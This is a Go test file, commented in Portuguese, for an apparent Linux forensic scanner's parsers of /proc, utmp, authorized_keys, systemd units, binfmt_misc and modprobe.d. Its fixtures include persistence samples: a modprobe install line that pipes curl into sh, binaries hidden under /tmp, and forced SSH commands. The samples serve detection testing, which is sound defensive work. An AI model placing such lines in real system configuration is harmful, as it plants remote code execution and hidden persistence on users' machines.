package facts

import (
	"os"
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/env"
)

// Tabela de FORMA CONDICIONAL dos parsers de /proc e /sys.
//
// É a irmã da tabela de evasão de internal/checks, e existe pela mesma razão:
// a catraca de cenário prova que o parser funciona sobre a saída que a fixture
// tem, e a saída do kernel é CONDICIONAL — campo que só aparece em certos
// estados, sufixo que desloca índice, escape que só acontece para alguns bytes.
// Todo bug de parser desta base veio daí: o `tramp:` ausente no ftrace, o
// `+`/`-` do taint, o offset do binfmt, o TAB do @reboot, o \012 do maps.
//
// Cada caso cita o ARQUIVO DO KERNEL que produz aquela forma. Sem a citação, a
// linha é palpite; com ela, é contrato verificável.

// fs/proc/array.c:589 escreve o comm entre parênteses com proc_task_name(...,
// escape=false) — ao contrário do /proc/PID/status, que usa escape=true. Ou
// seja: no stat o comm sai CRU, e pode conter espaço, parêntese e qualquer
// byte que caiba em TASK_COMM_LEN. Quem separa por espaço, ou por LastIndex do
// primeiro ')', lê o campo errado — e todos os 50+ campos seguintes saem
// deslocados, inclusive o starttime que data o processo.
// O que splitStatComm já cobre é o comm em si; o que faltava é o DESLOCAMENTO
// que ele causa. Todos os 50+ campos seguintes são lidos por índice — o
// starttime, que data o processo, é o 22º —, e um comm mal delimitado empurra
// todos eles. É por isso que o teste afirma a fatia inteira e não só o nome.
func TestSplitStatCommNaoDeslocaOsCamposSeguintes(t *testing.T) {
	casos := []struct {
		nome, linha, comm string
		rest              []string
	}{
		{"normal", "1 (systemd) S 0 1 1", "systemd", []string{"S", "0", "1", "1"}},
		{"comm com espaco", "42 (my daemon) R 1 42", "my daemon", []string{"R", "1", "42"}},
		{"comm com parenteses", "7 (proc(x)) D 1 7", "proc(x)", []string{"D", "1", "7"}},
		// O caso adversário: um comm que IMITA o resto da linha. Só o
		// LastIndex de ')' delimita certo — qualquer varredura da esquerda para
		// a direita corta cedo e desloca tudo.
		{"comm que imita a linha", "9 (a) S 1 (b) R 2) T 3 4", "a) S 1 (b) R 2", []string{"T", "3", "4"}},
	}
	for _, c := range casos {
		comm, rest, ok := splitStatComm(c.linha)
		if !ok {
			t.Errorf("%s: não parseou", c.nome)
			continue
		}
		if comm != c.comm {
			t.Errorf("%s: comm=%q, quer %q", c.nome, comm, c.comm)
		}
		if len(rest) != len(c.rest) {
			t.Errorf("%s: %d campos depois do comm, quer %d: %v", c.nome, len(rest), len(c.rest), rest)
			continue
		}
		for i := range rest {
			if rest[i] != c.rest[i] {
				t.Errorf("%s: campo %d = %q, quer %q (a linha inteira deslocou)",
					c.nome, i, rest[i], c.rest[i])
			}
		}
	}
}

// O utmp tem DOIS tamanhos de registro — 384 em 32 bits e 400 em 64 —, e o
// arquivo VAZIO é o estado de toda instalação nova e de todo contêiner. Tratar
// vazio como formato desconhecido poria uma lacuna em cada varredura do mundo;
// tratar tamanho ímpar como conhecido inventaria um inventário de login.
func TestTamanhoDoRegistroUtmp(t *testing.T) {
	casos := []struct {
		nome    string
		tamanho int64
		quer    int
		ok      bool
	}{
		{"vazio", 0, tamanhoNativoDeUtmp, true},
		{"multiplo de 32 bits", tamUtmp32 * 3, tamUtmp32, true},
		{"multiplo de 64 bits", tamUtmp64 * 3, tamUtmp64, true},
		{"truncado no meio", tamUtmp64*2 + 7, 0, false},
		{"negativo", -1, 0, false},
	}
	for _, c := range casos {
		got, ok := tamanhoDoRegistro(c.tamanho)
		if ok != c.ok || (ok && got != c.quer) {
			t.Errorf("%s (%d bytes) = %d,%v — quer %d,%v", c.nome, c.tamanho, got, ok, c.quer, c.ok)
		}
	}
}

// mangle_path (fs/seq_file.c) escapa APENAS os bytes que estão em `esc`, como
// \NNN octal. Para o maps, seq_path(m, path, "\n") passa só a nova linha; para
// o mountinfo, seq_path_root(..., " \t\n\\") passa espaço, tab, nova linha e a
// própria barra. Não existe caso especial para "\\": um caminho com barra
// invertida literal sai CRU no maps e escapado no mountinfo.
func TestDesescapaOctalDoKernel(t *testing.T) {
	casos := []struct{ nome, dentro, fora string }{
		{"sem escape", "/usr/lib/libc.so.6", "/usr/lib/libc.so.6"},
		{"nova linha (maps e mountinfo)", `/tmp/lib\012evil.so`, "/tmp/lib\nevil.so"},
		{"espaco (mountinfo)", `/mnt/disco\040externo`, "/mnt/disco externo"},
		{"tab (mountinfo)", `/mnt/a\011b`, "/mnt/a\tb"},
		{"barra invertida (mountinfo)", `/mnt/a\134b`, `/mnt/a\b`},
		{"octal invalido fica cru", `/tmp/a\999b`, `/tmp/a\999b`},
		{"barra solta no fim", `/tmp/a\`, `/tmp/a\`},
	}
	for _, c := range casos {
		if got := desescapaMtree(c.dentro); got != c.fora {
			t.Errorf("%s: desescapaMtree(%q) = %q, quer %q", c.nome, c.dentro, got, c.fora)
		}
	}
}

// /proc/net/tcp imprime o endereço com cada palavra de 32 bits em ordem de
// HOST. Ignorar a inversão faz 127.0.0.1 virar 1.0.0.127 — e aí loopback é
// classificado como público, e todo processo local vira "conexão de saída para
// endereço público".
func TestParseHexAddrOrdemDePalavra(t *testing.T) {
	casos := []struct {
		nome, in, ip string
		porta        int
		ok           bool
	}{
		{"loopback v4", "0100007F:1F90", "127.0.0.1", 8080, true},
		{"qualquer", "00000000:0016", "0.0.0.0", 22, true},
		{"privado", "6C00A8C0:CB2E", "192.168.0.108", 52014, true},
		{"loopback v6", "00000000000000000000000001000000:0050", "::1", 80, true},
		{"sem porta", "0100007F", "", 0, false},
		{"hex invalido", "ZZZZZZZZ:0050", "", 0, false},
	}
	for _, c := range casos {
		ip, porta, ok := parseHexAddr(c.in)
		if ok != c.ok || (ok && (ip != c.ip || porta != c.porta)) {
			t.Errorf("%s: parseHexAddr(%q) = %s:%d,%v — quer %s:%d,%v",
				c.nome, c.in, ip, porta, ok, c.ip, c.porta, c.ok)
		}
	}
}

// /proc/PID/cgroup tem DUAS gramáticas na mesma leitura, e proc_cgroup_show
// (kernel/cgroup/cgroup.c) escreve as duas: `%d:` da hierarquia, depois a lista
// de controladores — VAZIA para a raiz unificada (v2) —, depois `:` e o
// caminho. No v1 há uma LINHA POR CONTROLADOR, e só a de `name=systemd` carrega
// a unit: pegar a primeira, que pode ser cpuset ou freezer, destrói a
// proveniência que este campo existe para preservar quando o PPid vira 1.
func TestParseCgroupDuasGramaticas(t *testing.T) {
	casos := []struct{ nome, texto, quer string }{
		{"v2 puro", "0::/system.slice/nginx.service", "/system.slice/nginx.service"},
		{"v1 com systemd", "8:cpuset:/\n5:freezer:/\n1:name=systemd:/system.slice/ssh.service",
			"/system.slice/ssh.service"},
		{"v1 sem systemd cai no primeiro", "8:cpuset:/docker/abc\n5:freezer:/docker/abc",
			"/docker/abc"},
		// HÍBRIDO (v1 e v2 montados juntos, que é o padrão de várias distros com
		// systemd.unified_cgroup_hierarchy=0): as DUAS linhas aparecem, e é a de
		// name=systemd que carrega a unit — a linha `0::` ali costuma trazer só
		// a raiz. Preferir o v2 por ser "mais moderno" perderia justamente a
		// proveniência que este campo existe para preservar.
		{"hibrido: name=systemd carrega a unit",
			"1:name=systemd:/system.slice/x.service\n0::/",
			"/system.slice/x.service"},
		// O caminho pode conter ':' — o SplitN em 3 é o que preserva isso.
		{"caminho com dois-pontos", "0::/system.slice/x:y.service", "/system.slice/x:y.service"},
		{"linha truncada é ignorada", "0::\n1:name=systemd:/ok.service", ""},
		{"vazio", "", ""},
	}
	for _, c := range casos {
		if got := parseCgroup(c.texto); got != c.quer {
			t.Errorf("%s: parseCgroup = %q, quer %q", c.nome, got, c.quer)
		}
	}
}

// authorized_keys aceita um bloco de OPÇÕES antes do tipo da chave, e é ali que
// mora a persistência: `command=` força um comando a cada login, e o valor é
// entre aspas e pode conter espaço, vírgula e aspas escapadas. Cortar no
// primeiro espaço ou na primeira vírgula quebra o bloco e faz a chave inteira
// ser lida errado — inclusive o fingerprint, que é como ela é reconhecida.
func TestParseAuthorizedKeyComOpcoes(t *testing.T) {
	const blob = "AAAAC3NzaC1lZDI1NTE5AAAAIExemploDeChaveParaTeste"
	casos := []struct{ nome, linha, tipo, opts, coment string }{
		{"sem opções", "ssh-ed25519 " + blob + " ana@host", "ssh-ed25519", "", "ana@host"},
		{"opção simples", "no-pty ssh-ed25519 " + blob + " x", "ssh-ed25519", "no-pty", "x"},
		{"command com espaço", `command="/usr/bin/rsync --server" ssh-ed25519 ` + blob + " x",
			"ssh-ed25519", `command="/usr/bin/rsync --server"`, "x"},
		{"command com vírgula dentro das aspas",
			`command="/bin/sh -c 'a,b'",no-pty ssh-ed25519 ` + blob + " x",
			"ssh-ed25519", `command="/bin/sh -c 'a,b'",no-pty`, "x"},
		{"from com curinga", `from="10.0.0.*,!10.0.0.5" ssh-rsa ` + blob + " x",
			"ssh-rsa", `from="10.0.0.*,!10.0.0.5"`, "x"},
		{"sem comentário", "ssh-ed25519 " + blob, "ssh-ed25519", "", ""},
	}
	for _, c := range casos {
		k := parseAuthorizedKey(c.linha)
		if k.Type != c.tipo {
			t.Errorf("%s: tipo=%q, quer %q", c.nome, k.Type, c.tipo)
		}
		if k.Options != c.opts {
			t.Errorf("%s: opções=%q, quer %q", c.nome, k.Options, c.opts)
		}
		if k.Comment != c.coment {
			t.Errorf("%s: comentário=%q, quer %q", c.nome, k.Comment, c.coment)
		}
		if c.tipo != "" && k.Fingerprint == "" {
			t.Errorf("%s: sem fingerprint — a chave não é reconhecível", c.nome)
		}
	}
}

// Unit de systemd tem três formas condicionais que mudam o que é lido:
// continuação de linha com `\`, prefixos de execução (`-@+!!!`) que o systemd
// aceita antes do caminho, e `ExecStart=` VAZIO, que RESETA a lista — é assim
// que um drop-in substitui o comando da unit original, e ler isso errado faz o
// relatório acusar um ExecStart que não roda mais.
func TestParseUnitFileFormasCondicionais(t *testing.T) {
	escrever := func(t *testing.T, corpo string) Unit {
		t.Helper()
		raiz := t.TempDir()
		p := raiz + "/x.service"
		if err := os.WriteFile(p, []byte(corpo), 0o644); err != nil {
			t.Fatal(err)
		}
		e := env.Probe(env.Options{Root: raiz, Version: "test"})
		t.Cleanup(func() { e.Close() })
		return parseUnitFile(e, "/x.service", "system", false)
	}

	t.Run("continuacao de linha", func(t *testing.T) {
		u := escrever(t, "[Service]\nExecStart=/usr/bin/app \\\n  --flag \\\n  --outra\n")
		if len(u.Exec) != 1 {
			t.Fatalf("a continuação tinha de virar UM comando: %+v", u.Exec)
		}
		if !strings.Contains(u.Exec[0].Cmd, "--flag") || !strings.Contains(u.Exec[0].Cmd, "--outra") {
			t.Errorf("as continuações se perderam: %q", u.Exec[0].Cmd)
		}
	})

	t.Run("ExecStart vazio reseta", func(t *testing.T) {
		u := escrever(t, "[Service]\nExecStart=/usr/bin/legitimo\nExecStart=\nExecStart=/tmp/.x\n")
		if len(u.Exec) != 1 || !strings.Contains(u.Exec[0].Cmd, "/tmp/.x") {
			t.Errorf("o `ExecStart=` vazio RESETA: só o último vale, veio %+v", u.Exec)
		}
	})

	t.Run("multiplos ExecStart acumulam", func(t *testing.T) {
		u := escrever(t, "[Service]\nExecStartPre=/bin/a\nExecStart=/bin/b\nExecStartPost=/bin/c\n")
		if len(u.Exec) != 3 {
			t.Errorf("Pre, Start e Post são três comandos: %+v", u.Exec)
		}
	})

	t.Run("comentario e secao nao viram chave", func(t *testing.T) {
		u := escrever(t, "# ExecStart=/tmp/.fake\n; ExecStart=/tmp/.fake2\n[Service]\nExecStart=/bin/ok\n")
		if len(u.Exec) != 1 || !strings.Contains(u.Exec[0].Cmd, "/bin/ok") {
			t.Errorf("comentário não executa nada: %+v", u.Exec)
		}
	})
}

// O registro de binfmt_misc tem DELIMITADOR ARBITRÁRIO: o primeiro byte da
// linha é o separador, e o formato é
// :nome:tipo:offset:magic:mask:interpretador:flags. Quem fixar ':' não lê o
// registro que usa '|' — e o delimitador é escolha de quem escreve o arquivo,
// ou seja, do adversário.
func TestParseBinfmtLinhaDelimitadorArbitrario(t *testing.T) {
	casos := []struct {
		nome, linha, interp, flags string
		ok                         bool
	}{
		{"delimitador dois-pontos", ":qemu:M::\\x7fELF::/usr/bin/qemu-arm:OCF",
			"/usr/bin/qemu-arm", "OCF", true},
		{"delimitador barra vertical", "|evil|M||\\x7fELF||/tmp/.x|F",
			"/tmp/.x", "F", true},
		{"delimitador cerquilha", "#x#E##.foo##/tmp/.y#", "/tmp/.y", "", true},
		{"sem interpretador é recusado", ":x:M::\\x7fELF:::", "", "", false},
		{"campos de menos", ":x:M:", "", "", false},
		{"linha curta demais", ":", "", "", false},
	}
	for _, c := range casos {
		got, ok := parseBinfmtLinha(c.linha)
		if ok != c.ok {
			t.Errorf("%s: ok=%v, quer %v", c.nome, ok, c.ok)
			continue
		}
		if !ok {
			continue
		}
		if got.Interpreter != c.interp {
			t.Errorf("%s: interpretador=%q, quer %q", c.nome, got.Interpreter, c.interp)
		}
		if got.Flags != c.flags {
			t.Errorf("%s: flags=%q, quer %q", c.nome, got.Flags, c.flags)
		}
	}
}

// modprobe.d: `install` e `alias` EXECUTAM, `blacklist` e `options` não. E o
// comando pode ter qualquer número de tokens — juntá-lo errado perde o payload.
func TestLerModprobeSoAsDiretivasQueExecutam(t *testing.T) {
	raiz := t.TempDir()
	if err := os.MkdirAll(raiz+"/etc/modprobe.d", 0o755); err != nil {
		t.Fatal(err)
	}
	corpo := "# comentário\n" +
		"blacklist nouveau\n" +
		"options snd slots=x\n" +
		"install evil /bin/sh -c 'curl http://e|sh'\n" +
		"alias net-pf-99 /tmp/.x\n" +
		"install truncado\n"
	if err := os.WriteFile(raiz+"/etc/modprobe.d/x.conf", []byte(corpo), 0o644); err != nil {
		t.Fatal(err)
	}
	e := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e.Close()
	f := &Facts{}
	lerModprobe(f, e, "/etc/modprobe.d/x.conf")

	if len(f.Modules) != 2 {
		t.Fatalf("só install e alias executam; blacklist, options e a linha "+
			"truncada não: %+v", f.Modules)
	}
	if f.Modules[0].Kind != "install" || !strings.Contains(f.Modules[0].Cmd, "curl") ||
		!strings.Contains(f.Modules[0].Cmd, "|sh") {
		t.Errorf("o comando inteiro precisa sobreviver: %+v", f.Modules[0])
	}
	if f.Modules[1].Kind != "alias" || f.Modules[1].Cmd != "/tmp/.x" {
		t.Errorf("alias: %+v", f.Modules[1])
	}
}
